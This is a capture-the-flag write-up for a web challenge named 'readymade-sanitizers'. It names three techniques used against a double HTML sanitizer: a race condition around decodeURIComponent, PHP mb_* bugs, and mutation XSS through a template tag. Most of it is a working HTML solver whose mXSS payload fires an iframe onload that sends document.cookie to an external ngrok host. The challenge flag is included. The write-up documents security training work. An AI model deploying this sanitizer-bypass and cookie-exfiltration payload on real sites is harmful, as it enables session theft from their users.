# [web] - [readymade-sanitizers]

## Author
nyxmare

## Description
Yet another HTML previewer, but i am pretty sure it's safe

## Overview & Solution

- Race condition frontend to bypass invalid URI in `decodeURIComponent`
- PHP Bugs in mb_* 
- MXSS using template tag in custom sanitizer


### Solver

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>

        let sc = 'location=`https://aafe-111-94-127-81.ngrok-free.app/pof?x=${document.cookie}`'
        // sc = `alert(1)`
        let l = window.open(`http://php:1234/#a`, sc)
        setTimeout(() => {
            l.location = `http://php:1234/#%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0nyx<template><math><mtext><table><mglyph><style></template>mare<iframe onload=${encodeURIComponent(sc)}>f`
        }, 100);
    </script>
</body>
</html>
```


## Flag
`CJ{dawg_bro_is_bypassing_double_sanitizers}`